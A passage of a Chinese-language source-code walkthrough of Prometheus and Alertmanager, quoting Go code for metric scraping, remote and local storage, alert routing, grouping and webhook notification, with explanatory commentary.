close(sl.stopped) return case &lt;-sl.scrapeCtx.Done(): break mainLoop default: &#125; var ( start = time.Now() scrapeCtx, cancel = context.WithTimeout(sl.ctx, timeout) ) // Only record after the first scrape. if !last.IsZero() &#123; targetIntervalLength.WithLabelValues(interval.String()).Observe( time.Since(last).Seconds(), ) &#125; //根据最后一次的scrape到指标的大小来申请本次存储空间 b := sl.buffers.Get(sl.lastScrapeSize) buf := bytes.NewBuffer(b) //scrape指标 scrapeErr := sl.scraper.scrape(scrapeCtx, buf) cancel() if scrapeErr == nil &#123; b = buf.Bytes() // NOTE: There were issues with misbehaving clients in the past // that occasionally returned empty results. We don't want those // to falsely reset our buffer size. if len(b) &gt; 0 &#123; //记录本次scrape到指标的大小 sl.lastScrapeSize = len(b) &#125; &#125; else &#123; level.Debug(sl.l).Log(\"msg\", \"Scrape failed\", \"err\", scrapeErr.Error()) if errc != nil &#123; errc &lt;- scrapeErr &#125; &#125; // A failed scrape is the same as an empty scrape, // we still call sl.append to trigger stale markers. //存储指标 total, added, appErr := sl.append(b, start) if appErr != nil &#123; level.Warn(sl.l).Log(\"msg\", \"append failed\", \"err\", appErr) // The append failed, probably due to a parse error or sample limit. // Call sl.append again with an empty scrape to trigger stale markers. if _, _, err := sl.append([]byte&#123;&#125;, start); err != nil &#123; level.Warn(sl.l).Log(\"msg\", \"append failed\", \"err\", err) &#125; &#125; //对象复用 sl.buffers.Put(b) if scrapeErr == nil &#123; scrapeErr = appErr &#125; //统计采集到的指标 sl.report(start, time.Since(start), total, added, scrapeErr) last = start select &#123; case &lt;-sl.ctx.Done(): close(sl.stopped) return case &lt;-sl.scrapeCtx.Done(): break mainLoop case &lt;-ticker.C: &#125; &#125; close(sl.stopped) sl.endOfRunStaleness(last, ticker, interval)&#125; run方法中调用sl.scraper.scrape进行指标采集，并将采集到的指标通过sl.append方法进行存储。 再scrape过程中为了提供性能，使用sync.Pool机制来复用对象，再每次scrape后都会向pool申请和scrape结果相同大小的byte slice，并添加到sl.buffers中，以便供下一次获取指标使用 流程： LocalStorage/RemoteStoragePrometheus再通过scrape获取指标后，调用scrapeLoop.append方法将指标存储到fanoutStorage组件中，但再scrape与fanoutStorage之间加了一层scrapeCache，用于指标合法行校验。 scrapeCache缓存了两种不合法的指标： 1）指标纬度为空，无效指标 2）连续两次指标存储中，第一次存储的不带时间戳指标再第二次存储的不带时间戳指标中不存在，这部分指标过期指标 scrapeCache: 1234567891011121314151617181920212223242526272829303132// scrapeCache tracks mappings of exposed metric strings to label sets and// storage references. Additionally, it tracks staleness of series between// scrapes.type scrapeCache struct &#123; iter uint64 // Current scrape iteration. // 被缓存的批次数 // Parsed string to an entry with information about the actual label set // and its storage reference. entries map[string]*cacheEntry // 缓存本次采集的指标 // Cache of dropped metric strings and their iteration. The iteration must // be a pointer so we can update it without setting a new entry with an unsafe // string in addDropped(). dropped map[string]*uint64 //缓存本次采集的指标 // seriesCur and seriesPrev store the labels of series that were seen // in the current and previous scrape. // We hold two maps and swap them out to save allocations. seriesCur map[uint64]labels.Labels seriesPrev map[uint64]labels.Labels //缓存上次采集的指标&#125;func newScrapeCache() *scrapeCache &#123; return &amp;scrapeCache&#123; entries: map[string]*cacheEntry&#123;&#125;, dropped: map[string]*uint64&#123;&#125;, seriesCur: map[uint64]labels.Labels&#123;&#125;, seriesPrev: map[uint64]labels.Labels&#123;&#125;, &#125;&#125; scrapeCache主要方法： iterDone()；用于scrapeCache缓存整理 get:根据指标信息met获取cacheEntry结构 addRef：根据指标信息增加cacheEntry节点 addDropped:添加无效指标信息到dropped getDropped: 判断met是否为无效指标 trackStaleness:添加不带时间戳的指标到seriesCur列表 forEachStale：查找过期的指标 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154func (sl *scrapeLoop) append(b []byte, ts time.Time) (total, added int, err error) &#123; var ( app = sl.appender() p = textparse.New(b) defTime = timestamp.FromTime(ts) numOutOfOrder = 0 numDuplicates = 0 numOutOfBounds = 0 ) var sampleLimitErr errorloop: for p.Next() &#123; total++ t := defTime met, tp, v := p.At() if tp != nil &#123; t = *tp &#125; if sl.cache.getDropped(yoloString(met)) &#123; continue &#125; ce, ok := sl.cache.get(yoloString(met)) if ok &#123; switch err = app.AddFast(ce.lset, ce.ref, t, v); err &#123; case nil: if tp == nil &#123; sl.cache.trackStaleness(ce.hash, ce.lset) &#125; case storage.ErrNotFound: ok = false case storage.ErrOutOfOrderSample: numOutOfOrder++ level.Debug(sl.l).Log(\"msg\", \"Out of order sample\", \"series\", string(met)) targetScrapeSampleOutOfOrder.Inc() continue case storage.ErrDuplicateSampleForTimestamp: numDuplicates++ level.Debug(sl.l).Log(\"msg\", \"Duplicate sample for timestamp\", \"series\", string(met)) targetScrapeSampleDuplicate.Inc() continue case storage.ErrOutOfBounds: numOutOfBounds++ level.Debug(sl.l).Log(\"msg\", \"Out of bounds metric\", \"series\", string(met)) targetScrapeSampleOutOfBounds.Inc() continue case errSampleLimit: // Keep on parsing output if we hit the limit, so we report the correct // total number of samples scraped. sampleLimitErr = err added++ continue default: break loop &#125; &#125; if !ok &#123; var lset labels.Labels mets := p.Metric(&amp;lset) hash := lset.Hash() // Hash label set as it is seen local to the target. Then add target labels // and relabeling and store the final label set. lset = sl.sampleMutator(lset) // The label set may be set to nil to indicate dropping. if lset == nil &#123; sl.cache.addDropped(mets) continue &#125; var ref uint64 ref, err = app.Add(lset, t, v) // TODO(fabxc): also add a dropped-cache? switch err &#123; case nil: case storage.ErrOutOfOrderSample: err = nil numOutOfOrder++ level.Debug(sl.l).Log(\"msg\", \"Out of order sample\", \"series\", string(met)) targetScrapeSampleOutOfOrder.Inc() continue case storage.ErrDuplicateSampleForTimestamp: err = nil numDuplicates++ level.Debug(sl.l).Log(\"msg\", \"Duplicate sample for timestamp\", \"series\", string(met)) targetScrapeSampleDuplicate.Inc() continue case storage.ErrOutOfBounds: err = nil numOutOfBounds++ level.Debug(sl.l).Log(\"msg\", \"Out of bounds metric\", \"series\", string(met)) targetScrapeSampleOutOfBounds.Inc() continue case errSampleLimit: sampleLimitErr = err added++ continue default: level.Debug(sl.l).Log(\"msg\", \"unexpected error\", \"series\", string(met), \"err\", err) break loop &#125; if tp == nil &#123; // Bypass staleness logic if there is an explicit timestamp. sl.cache.trackStaleness(hash, lset) &#125; sl.cache.addRef(mets, ref, lset, hash) &#125; added++ &#125; if err == nil &#123; err = p.Err() &#125; if sampleLimitErr != nil &#123; // We only want to increment this once per scrape, so this is Inc'd outside the loop. targetScrapeSampleLimit.Inc() &#125; if numOutOfOrder &gt; 0 &#123; level.Warn(sl.l).Log(\"msg\", \"Error on ingesting out-of-order samples\", \"num_dropped\", numOutOfOrder) &#125; if numDuplicates &gt; 0 &#123; level.Warn(sl.l).Log(\"msg\", \"Error on ingesting samples with different value but same timestamp\", \"num_dropped\", numDuplicates) &#125; if numOutOfBounds &gt; 0 &#123; level.Warn(sl.l).Log(\"msg\", \"Error on ingesting samples that are too old or are too far into the future\", \"num_dropped\", numOutOfBounds) &#125; if err == nil &#123; sl.cache.forEachStale(func(lset labels.Labels) bool &#123; // Series no longer exposed, mark it stale. _, err = app.Add(lset, defTime, math.Float64frombits(value.StaleNaN)) switch err &#123; case storage.ErrOutOfOrderSample, storage.ErrDuplicateSampleForTimestamp: // Do not count these in logging, as this is expected if a target // goes away and comes back again with a new scrape loop. err = nil &#125; return err == nil &#125;) &#125; if err != nil &#123; app.Rollback() return total, added, err &#125; if err := app.Commit(); err != nil &#123; return total, added, err &#125; sl.cache.iterDone() return total, added, nil&#125; 存储指标append方法的具体实现， 存储指标的流程： prometheus支持远程存储，也支持本地存储。 remote中为远程存储， tsdb中为本地存储 远程存储：存储的数据，发送过来的样本先放入到队列中，这个队列的最大分片是1000，每个分片没秒1000个sample，那么一秒就可以发送1000*1000个sample。 数据结构为： 12345678910111213141516171819202122// QueueManager manages a queue of samples to be sent to the Storage// indicated by the provided StorageClient.type QueueManager struct &#123; logger log.Logger cfg config.QueueConfig //队列配置 externalLabels model.LabelSet // relabelConfigs []*config.RelabelConfig client StorageClient // 存储客户端 queueName string //队列名称 logLimiter *rate.Limiter //限流 shardsMtx sync.Mutex shards *shards //分片 numShards int //分片数目 reshardChan chan int quit chan struct&#123;&#125; wg sync.WaitGroup samplesIn, samplesOut, samplesOutDuration *ewmaRate integralAccumulator float64&#125; 构建好发送队列的函数： 12345678910111213141516171819202122232425262728293031323334// NewQueueManager builds a new QueueManager.func NewQueueManager(logger log.Logger, cfg config.QueueConfig, externalLabels model.LabelSet, relabelConfigs []*config.RelabelConfig, client StorageClient) *QueueManager &#123; if logger == nil &#123; logger = log.NewNopLogger() &#125; t := &amp;QueueManager&#123; logger: logger, cfg: cfg, externalLabels: externalLabels, relabelConfigs: relabelConfigs, client: client, queueName: client.Name(), logLimiter: rate.NewLimiter(logRateLimit, logBurst), numShards: 1, reshardChan: make(chan int), quit: make(chan struct&#123;&#125;), samplesIn: newEWMARate(ewmaWeight, shardUpdateDuration), samplesOut: newEWMARate(ewmaWeight, shardUpdateDuration), samplesOutDuration: newEWMARate(ewmaWeight, shardUpdateDuration), &#125; t.shards = t.newShards(t.numShards) numShards.WithLabelValues(t.queueName).Set(float64(t.numShards)) queueCapacity.WithLabelValues(t.queueName).Set(float64(t.cfg.Capacity)) // Initialise counter labels to zero. //初始化 sentBatchDuration.WithLabelValues(t.queueName) succeededSamplesTotal.WithLabelValues(t.queueName) failedSamplesTotal.WithLabelValues(t.queueName) droppedSamplesTotal.WithLabelValues(t.queueName) return t&#125; 调用append方法来添加样本数据到队列分片中 1234567891011121314151617181920212223242526272829303132333435// Append queues a sample to be sent to the remote storage. It drops the// sample on the floor if the queue is full.// Always returns nil.func (t *QueueManager) Append(s *model.Sample) error &#123; var snew model.Sample snew = *s snew.Metric = s.Metric.Clone() for ln, lv := range t.externalLabels &#123; if _, ok := s.Metric[ln]; !ok &#123; snew.Metric[ln] = lv &#125; &#125; snew.Metric = model.Metric( relabel.Process(model.LabelSet(snew.Metric), t.relabelConfigs...)) if snew.Metric == nil &#123; return nil &#125; t.shardsMtx.Lock() enqueued := t.shards.enqueue(&amp;snew) t.shardsMtx.Unlock() if enqueued &#123; queueLength.WithLabelValues(t.queueName).Inc() &#125; else &#123; droppedSamplesTotal.WithLabelValues(t.queueName).Inc() if t.logLimiter.Allow() &#123; level.Warn(t.logger).Log(\"msg\", \"Remote storage queue full, discarding sample. Multiple subsequent messages of this kind may be suppressed.\") &#125; &#125; return nil&#125; 其中使用的函数enqueue发送到队列里面： 12345678910111213func (s *shards) enqueue(sample *model.Sample) bool &#123; s.qm.samplesIn.incr(1) fp := sample.Metric.FastFingerprint() shard := uint64(fp) % uint64(len(s.queues)) select &#123; case s.queues[shard] &lt;- sample: return true default: return false &#125;&#125; 这个队列存储里面用余数去分组的。 使用start方法来启动队列发送任务： 12345func (s *shards) start() &#123; for i := 0; i &lt; len(s.queues); i++ &#123; go s.runShard(i) &#125;&#125; 函数runShared生成多个协程去执行： 123456789101112131415161718192021222324252627282930313233343536func (s *shards) runShard(i int) &#123; defer s.wg.Done() queue := s.queues[i] // Send batches of at most MaxSamplesPerSend samples to the remote storage. // If we have fewer samples than that, flush them out after a deadline // anyways. pendingSamples := model.Samples&#123;&#125; for &#123; select &#123; case sample, ok := &lt;-queue: if !ok &#123; if len(pendingSamples) &gt; 0 &#123; level.Debug(s.qm.logger).Log(\"msg\", \"Flushing samples to remote storage...\", \"count\", len(pendingSamples)) s.sendSamples(pendingSamples) level.Debug(s.qm.logger).Log(\"msg\", \"Done flushing.\") &#125; return &#125; queueLength.WithLabelValues(s.qm.queueName).Dec() pendingSamples = append(pendingSamples, sample) for len(pendingSamples) &gt;= s.qm.cfg.MaxSamplesPerSend &#123; s.sendSamples(pendingSamples[:s.qm.cfg.MaxSamplesPerSend]) pendingSamples = pendingSamples[s.qm.cfg.MaxSamplesPerSend:] &#125; case &lt;-time.After(s.qm.cfg.BatchSendDeadline): if len(pendingSamples) &gt; 0 &#123; s.sendSamples(pendingSamples) pendingSamples = pendingSamples[:0] &#125; &#125; &#125;&#125; 其中调用了方法sendSamples去发送样本： 123456789func (s *shards) sendSamples(samples model.Samples) &#123; begin := time.Now() s.sendSamplesWithBackoff(samples) // These counters are used to caclulate the dynamic sharding, and as such // should be maintained irrespective of success or failure. s.qm.samplesOut.incr(int64(len(samples))) s.qm.samplesOutDuration.incr(int64(time.Since(begin)))&#125; 其中方法使用了samplesOut和samplesOutDuration来计算分片的动态变化。保证成功发送和失败的数目。 启动调用函数sendSamplesWithBackOff函数来保证远程发送的时候失败的情况： 12345678910111213141516171819202122232425func (s *shards) sendSamplesWithBackoff(samples model.Samples) &#123; backoff := s.qm.cfg.MinBackoff for retries := s.qm.cfg.MaxRetries; retries &gt; 0; retries-- &#123; begin := time.Now() req := ToWriteRequest(samples) err := s.qm.client.Store(req) sentBatchDuration.WithLabelValues(s.qm.queueName).Observe(time.Since(begin).Seconds()) if err == nil &#123; succeededSamplesTotal.WithLabelValues(s.qm.queueName).Add(float64(len(samples))) return &#125; level.Warn(s.qm.logger).Log(\"msg\", \"Error sending samples to remote storage\", \"count\", len(samples), \"err\", err) if _, ok := err.(recoverableError); !ok &#123; break &#125; time.Sleep(backoff) backoff = backoff * 2 if backoff &gt; s.qm.cfg.MaxBackoff &#123; backoff = s.qm.cfg.MaxBackoff &#125; &#125;failedSamplesTotal.WithLabelValues(s.qm.queueName).Add(float64(len(samples)))&#125; 如果发送失败会重试几次，如果还是失败，会将发送失败的样本计入失败的计算器。 如果成功，会调用Client中的Store方法： 1234567891011121314151617181920212223242526272829303132333435363738394041func (c *Client) Store(req *prompb.WriteRequest) error &#123; data, err := proto.Marshal(req) if err != nil &#123; return err &#125; compressed := snappy.Encode(nil, data) httpReq, err := http.NewRequest(\"POST\", c.url.String(), bytes.NewReader(compressed)) if err != nil &#123; // Errors from NewRequest are from unparseable URLs, so are not // recoverable. return err &#125; httpReq.Header.Add(\"Content-Encoding\", \"snappy\") httpReq.Header.Set(\"Content-Type\", \"application/x-protobuf\") httpReq.Header.Set(\"X-Prometheus-Remote-Write-Version\", \"0.1.0\") ctx, cancel := context.WithTimeout(context.Background(), c.timeout) defer cancel() httpResp, err := ctxhttp.Do(ctx, c.client, httpReq) if err != nil &#123; // Errors from client.Do are from (for example) network errors, so are // recoverable. return recoverableError&#123;err&#125; &#125; defer httpResp.Body.Close() if httpResp.StatusCode/100 != 2 &#123; scanner := bufio.NewScanner(io.LimitReader(httpResp.Body, maxErrMsgLen)) line := \"\" if scanner.Scan() &#123; line = scanner.Text() &#125; err = fmt.Errorf(\"server returned HTTP status %s: %s\", httpResp.Status, line) &#125; if httpResp.StatusCode/100 == 5 &#123; return recoverableError&#123;err&#125; &#125; return err&#125; 通过post方式，发送数据。 本地存储主要使用的tsdb库中，后面的版本对tsdb有较为大的变化。 fanout为本地和远程的读写代理器，入口在fanout中，fanout的数据结构 123456type fanout struct &#123; logger log.Logger primary Storage secondaries []Storage&#125; 初始化数据结构： 123456789// NewFanout returns a new fan-out Storage, which proxies reads and writes// through to multiple underlying storages.func NewFanout(logger log.Logger, primary Storage, secondaries ...Storage) Storage &#123; return &amp;fanout&#123; logger: logger, primary: primary, secondaries: secondaries, &#125;&#125; 添加数据使用appender方法： 1234567891011121314151617181920func (f *fanout) Appender() (Appender, error) &#123; primary, err := f.primary.Appender() if err != nil &#123; return nil, err &#125; secondaries := make([]Appender, 0, len(f.secondaries)) for _, storage := range f.secondaries &#123; appender, err := storage.Appender() if err != nil &#123; return nil, err &#125; secondaries = append(secondaries, appender) &#125; return &amp;fanoutAppender&#123; logger: f.logger, primary: primary, secondaries: secondaries, &#125;, nil&#125; 本地存储使用tsdb来存储： prometheus中提供了接口，调用tsdb数据库来进行存储。tsdb后续单独来说明。 打开一个db库函数： 1234567891011121314151617181920212223242526func Open(path string, l log.Logger, r prometheus.Registerer, opts *Options) (*tsdb.DB, error) &#123; if opts.MinBlockDuration &gt; opts.MaxBlockDuration &#123; opts.MaxBlockDuration = opts.MinBlockDuration &#125; // Start with smallest block duration and create exponential buckets until the exceed the // configured maximum block duration. rngs := tsdb.ExponentialBlockRanges(int64(time.Duration(opts.MinBlockDuration).Seconds()*1000), 10, 3) for i, v := range rngs &#123; if v &gt; int64(time.Duration(opts.MaxBlockDuration).Seconds()*1000) &#123; rngs = rngs[:i] break &#125; &#125; db, err := tsdb.Open(path, l, r, &amp;tsdb.Options&#123; WALFlushInterval: 10 * time.Second, RetentionDuration: uint64(time.Duration(opts.Retention).Seconds() * 1000), BlockRanges: rngs, NoLockfile: opts.NoLockfile, &#125;) if err != nil &#123; return nil, err &#125; return db, nil&#125; AlertManager接收告警信息请求的地址为：http://localhost:9093/api/v1/alerts，api接收告警信息后会进入到api.addAlerts中。 AlertManager服务启动时候，api.addAlerts方法会通过api.Register方法再路由中完成路由请求地址的注册。 在api.addAlerts方法中，会将从参数r中接受到的告警信息解析为types.Alert数组，最后将其插入本地缓存中。 1234567891011121314151617181920212223func (api *API) addAlerts(w http.ResponseWriter, r *http.Request) &#123; var alerts []*types.Alert if err := receive(r, &amp;alerts); err != nil &#123; respondError(w, apiError&#123; typ: errorBadData, err: err, &#125;, nil) return &#125; api.insertAlerts(w, r, alerts...)&#125;func receive(r *http.Request, v interface&#123;&#125;) error &#123; dec := json.NewDecoder(r.Body) defer r.Body.Close() err := dec.Decode(v) if err != nil &#123; log.Debugf(\"Decoding request failed: %v\", err) &#125; return err&#125; 告警调度： 告警信息被插入AlertManager本地缓存后，会通过告警调度服务从本地缓存中获取告警信息，并将告警信息发送出去。 本地缓存基于内存实现， 告警调度服务的初始化代码在main中，reload方法完成， 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051reload := func() (err error) &#123; log.With(\"file\", *configFile).Infof(\"Loading configuration file\") defer func() &#123; if err != nil &#123; log.With(\"file\", *configFile).Errorf(\"Loading configuration file failed: %s\", err) configSuccess.Set(0) &#125; else &#123; configSuccess.Set(1) configSuccessTime.Set(float64(time.Now().Unix())) configHash.Set(hash) &#125; &#125;() conf, plainCfg, err := config.LoadFile(*configFile) if err != nil &#123; return err &#125; hash = md5HashAsMetricValue(plainCfg) err = apiv.Update(conf, time.Duration(conf.Global.ResolveTimeout)) if err != nil &#123; return err &#125; tmpl, err = template.FromGlobs(conf.Templates...) if err != nil &#123; return err &#125; tmpl.ExternalURL = amURL inhibitor.Stop() disp.Stop() inhibitor = inhibit.NewInhibitor(alerts, conf.InhibitRules, marker) pipeline = notify.BuildPipeline( conf.Receivers, tmpl, waitFunc, inhibitor, silences, notificationLog, marker, ) disp = dispatch.NewDispatcher(alerts, dispatch.NewRoute(conf.Route, nil), pipeline, marker, timeoutFunc) go disp.Run() go inhibitor.Run() return nil &#125; Run方法具体实现如下： 1234567891011121314// Run starts dispatching alerts incoming via the updates channel.func (d *Dispatcher) Run() &#123; d.done = make(chan struct&#123;&#125;) d.mtx.Lock() d.aggrGroups = map[*Route]map[model.Fingerprint]*aggrGroup&#123;&#125; d.mtx.Unlock() d.ctx, d.cancel = context.WithCancel(context.Background()) d.run(d.alerts.Subscribe()) close(d.done)&#125; Subscribe方法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// Subscribe returns an iterator over active alerts that have not been// resolved and successfully notified about.// They are not guaranteed to be in chronological order.func (a *Alerts) Subscribe() provider.AlertIterator &#123; var ( ch = make(chan *types.Alert, 200) done = make(chan struct&#123;&#125;) ) alerts, err := a.getPending() a.mtx.Lock() i := a.next a.next++ a.listeners[i] = ch a.mtx.Unlock() go func() &#123; defer func() &#123; a.mtx.Lock() delete(a.listeners, i) close(ch) a.mtx.Unlock() &#125;() //遍历告警列表 for _, a := range alerts &#123; select &#123; //将告警信息放入通道ch中 case ch &lt;- a: case &lt;-done: return &#125; &#125; &lt;-done &#125;() //构建告警信息迭代器 return provider.NewAlertIterator(ch, done, err)&#125;// NewAlertIterator returns a new AlertIterator based on the generic alertIterator typefunc NewAlertIterator(ch &lt;-chan *types.Alert, done chan struct&#123;&#125;, err error) AlertIterator &#123; return &amp;alertIterator&#123; ch: ch, done: done, err: err, &#125;&#125; run方法中，对告警信息的处理分为4步：获取告警信息，告警路由匹配，告警信息处理，清除告警信息为空的aggrGroup。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748func (d *Dispatcher) run(it provider.AlertIterator) &#123; cleanup := time.NewTicker(30 * time.Second) defer cleanup.Stop() defer it.Close() for &#123; select &#123; case alert, ok := &lt;-it.Next(): if !ok &#123; // Iterator exhausted for some reason. if err := it.Err(); err != nil &#123; log.Errorf(\"Error on alert update: %s\", err) &#125; return &#125; d.log.With(\"alert\", alert).Debug(\"Received alert\") // Log errors but keep trying. if err := it.Err(); err != nil &#123; log.Errorf(\"Error on alert update: %s\", err) continue &#125; //告警信息路由匹配 for _, r := range d.route.Match(alert.Labels) &#123; d.processAlert(alert, r) &#125; case &lt;-cleanup.C: d.mtx.Lock() //每隔30s清除为空的告警组 for _, groups := range d.aggrGroups &#123; for _, ag := range groups &#123; if ag.empty() &#123; ag.stop() delete(groups, ag.fingerprint()) &#125; &#125; &#125; d.mtx.Unlock() case &lt;-d.ctx.Done(): return &#125; &#125;&#125; 流程： 告警匹配： AlertManager以路由匹配方式实现了告警分组，不同分组下的告警可以使用各不同的告警接受方式，告警组等待时间，告警组发送间隔，重复告警发送间隔。 1234567891011121314151617181920212223242526// Match does a depth-first left-to-right search through the route tree// and returns the matching routing nodes.func (r *Route) Match(lset model.LabelSet) []*Route &#123; if !r.Matchers.Match(lset) &#123; return nil &#125; var all []*Route for _, cr := range r.Routes &#123; matches := cr.Match(lset) all = append(all, matches...) if matches != nil &amp;&amp; !cr.Continue &#123; break &#125; &#125; // If no child nodes were matches, the current node itself is a match. if len(all) == 0 &#123; all = append(all, r) &#125; return all&#125; 告警处理： 12345678910111213141516171819202122232425262728293031323334353637383940// processAlert determines in which aggregation group the alert falls// and insert it.func (d *Dispatcher) processAlert(alert *types.Alert, route *Route) &#123; group := model.LabelSet&#123;&#125; //获取分组的维度和纬度值 for ln, lv := range alert.Labels &#123; if _, ok := route.RouteOpts.GroupBy[ln]; ok &#123; group[ln] = lv &#125; &#125; fp := group.Fingerprint() d.mtx.Lock() groups, ok := d.aggrGroups[route] //判断是否需要新建告警组 if !ok &#123; groups = map[model.Fingerprint]*aggrGroup&#123;&#125; d.aggrGroups[route] = groups &#125; d.mtx.Unlock() // If the group does not exist, create it. ag, ok := groups[fp] //判断是否新建路由组 if !ok &#123; ag = newAggrGroup(d.ctx, group, route, d.timeout) groups[fp] = ag //启动告警组 go ag.run(func(ctx context.Context, alerts ...*types.Alert) bool &#123; _, _, err := d.stage.Exec(ctx, alerts...) if err != nil &#123; log.Errorf(\"Notify for %d alerts failed: %s\", len(alerts), err) &#125; return err == nil &#125;) &#125; ag.insert(alert)&#125; run方法： 123456789101112131415161718192021222324252627282930313233343536373839404142func (ag *aggrGroup) run(nf notifyFunc) &#123; ag.done = make(chan struct&#123;&#125;) defer close(ag.done) defer ag.next.Stop() for &#123; select &#123; case now := &lt;-ag.next.C: // Give the notifcations time until the next flush to // finish before terminating them. ctx, cancel := context.WithTimeout(ag.ctx, ag.timeout(ag.opts.GroupInterval)) // The now time we retrieve from the ticker is the only reliable // point of time reference for the subsequent notification pipeline. // Calculating the current time directly is prone to flaky behavior, // which usually only becomes apparent in tests. //记录告警开始时间 ctx = notify.WithNow(ctx, now) // Populate context with information needed along the pipeline. ctx = notify.WithGroupKey(ctx, ag.GroupKey()) ctx = notify.WithGroupLabels(ctx, ag.labels) ctx = notify.WithReceiverName(ctx, ag.opts.Receiver) ctx = notify.WithRepeatInterval(ctx, ag.opts.RepeatInterval) // Wait the configured interval before calling flush again. ag.mtx.Lock() ag.next.Reset(ag.opts.GroupInterval) ag.mtx.Unlock() ag.flush(func(alerts ...*types.Alert) bool &#123; return nf(ctx, alerts...) &#125;) cancel() case &lt;-ag.ctx.Done(): return &#125; &#125;&#125; flush方法中对告警信息进行两次复制，并分别将其缓存到alerts和alertsSlice中，告警信息通过传入的参数notify再次告警通知，之后再告警列表中删除过期的告警。 flush方法： 12345678910111213141516171819202122232425262728293031323334// flush sends notifications for all new alerts.func (ag *aggrGroup) flush(notify func(...*types.Alert) bool) &#123; if ag.empty() &#123; return &#125; ag.mtx.Lock() var ( alerts = make(map[model.Fingerprint]*types.Alert, len(ag.alerts)) alertsSlice = make([]*types.Alert, 0, len(ag.alerts)) ) for fp, alert := range ag.alerts &#123; alerts[fp] = alert alertsSlice = append(alertsSlice, alert) &#125; ag.mtx.Unlock() ag.log.Debugln(\"flushing\", alertsSlice) if notify(alertsSlice...) &#123; ag.mtx.Lock() for fp, a := range alerts &#123; // Only delete if the fingerprint has not been inserted // again since we notified about it. if a.Resolved() &amp;&amp; ag.alerts[fp] == a &#123; delete(ag.alerts, fp) &#125; &#125; ag.hasSent = true ag.mtx.Unlock() &#125;&#125; 告警的过期时间由alertmanager.yml配置文件中的resolve_timeout配置项指定，默认5m. flush方法的notify参数为func(…*types.Alert) bool类型，而notify方法最终会调用d.stage.Exec进行告警处理。 主要流程： 告警通知： 主要流程： 1）main方法中调用notify.BuildPipeline方法生成RoutingStage，并作为参数传递到dispatcher的NewDispatcher方法中，从而完成调度器Dispatcher的构建，并将RoutingStage赋值给调度器成stage. 2）processAlerts定义匿名回调方法func(ctx context.Context, alerts … *types.Alert) bool 再匿名方法的实现调用d.stage.Exec(ctx, alerts…)发送告警。 BuildPipeline构建一个执行的调用链，该链有RoutingStage，MultiStage,FanoutStage, inhibitStage, SilenceStage, WaitStage, DehupStage等多阶段。 1234567891011121314151617181920// BuildPipeline builds a map of receivers to Stages.func BuildPipeline( confs []*config.Receiver, tmpl *template.Template, wait func() time.Duration, inhibitor *inhibit.Inhibitor, silences *silence.Silences, notificationLog nflog.Log, marker types.Marker,) RoutingStage &#123; rs := RoutingStage&#123;&#125; is := NewInhibitStage(inhibitor, marker) ss := NewSilenceStage(silences, marker) for _, rc := range confs &#123; rs[rc.Name] = MultiStage&#123;is, ss, createStage(rc, tmpl, wait, notificationLog)&#125; &#125; return rs&#125; createStage方法： 12345678910111213141516171819// createStage creates a pipeline of stages for a receiver.func createStage(rc *config.Receiver, tmpl *template.Template, wait func() time.Duration, notificationLog nflog.Log) Stage &#123; var fs FanoutStage for _, i := range BuildReceiverIntegrations(rc, tmpl) &#123; recv := &amp;nflogpb.Receiver&#123; GroupName: rc.Name, Integration: i.name, Idx: uint32(i.idx), &#125; var s MultiStage s = append(s, NewWaitStage(wait)) s = append(s, NewDedupStage(notificationLog, recv, i.conf.SendResolved())) s = append(s, NewRetryStage(i)) s = append(s, NewSetNotifiesStage(notificationLog, recv)) fs = append(fs, s) &#125; return fs&#125; BuildReceiverIntegrations方法主要用于构建告警接收器对应的Notifier，兵器再alertmanager.yml配置文件中的每种告警接收器，可以定义多种Notifier。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// BuildReceiverIntegrations builds a list of integration notifiers off of a// receivers config.func BuildReceiverIntegrations(nc *config.Receiver, tmpl *template.Template) []Integration &#123; var ( integrations []Integration add = func(name string, i int, n Notifier, nc notifierConfig) &#123; integrations = append(integrations, Integration&#123; notifier: n, conf: nc, name: name, idx: i, &#125;) &#125; ) for i, c := range nc.WebhookConfigs &#123; n := NewWebhook(c, tmpl) add(\"webhook\", i, n, c) &#125; for i, c := range nc.EmailConfigs &#123; n := NewEmail(c, tmpl) add(\"email\", i, n, c) &#125; for i, c := range nc.PagerdutyConfigs &#123; n := NewPagerDuty(c, tmpl) add(\"pagerduty\", i, n, c) &#125; for i, c := range nc.OpsGenieConfigs &#123; n := NewOpsGenie(c, tmpl) add(\"opsgenie\", i, n, c) &#125; for i, c := range nc.SlackConfigs &#123; n := NewSlack(c, tmpl) add(\"slack\", i, n, c) &#125; for i, c := range nc.HipchatConfigs &#123; n := NewHipchat(c, tmpl) add(\"hipchat\", i, n, c) &#125; for i, c := range nc.VictorOpsConfigs &#123; n := NewVictorOps(c, tmpl) add(\"victorops\", i, n, c) &#125; for i, c := range nc.PushoverConfigs &#123; n := NewPushover(c, tmpl) add(\"pushover\", i, n, c) &#125; return integrations&#125; 以webhook类型Notifier为列，数据格式化之后，以post方式发送告警信息。 1234567891011121314151617181920212223242526272829303132333435// Notify implements the Notifier interface.func (w *Webhook) Notify(ctx context.Context, alerts ...*types.Alert) (bool, error) &#123; data := w.tmpl.Data(receiverName(ctx), groupLabels(ctx), alerts...) groupKey, ok := GroupKey(ctx) if !ok &#123; log.Errorf(\"group key missing\") &#125; msg := &amp;WebhookMessage&#123; Version: \"4\", Data: data, GroupKey: groupKey, &#125; var buf bytes.Buffer if err := json.NewEncoder(&amp;buf).Encode(msg); err != nil &#123; return false, err &#125; req, err := http.NewRequest(\"POST\", w.URL, &amp;buf) if err != nil &#123; return true, err &#125; req.Header.Set(\"Content-Type\", contentTypeJSON) req.Header.Set(\"User-Agent\", userAgentHeader) resp, err := ctxhttp.Do(ctx, http.DefaultClient, req) if err != nil &#123; return true, err &#125; resp.Body.Close() return w.retry(resp.StatusCode)&#125; 调用链的执行流程： RoutingStage阶段的Exec方法： 1234567891011121314// Exec implements the Stage interface.func (rs RoutingStage) Exec(ctx context.Context, alerts ...*types.Alert) (context.Context, []*types.Alert, error) &#123; receiver, ok := ReceiverName(ctx) if !ok &#123; return ctx, nil, fmt.Errorf(\"receiver missing\") &#125; s, ok := rs[receiver] if !ok &#123; 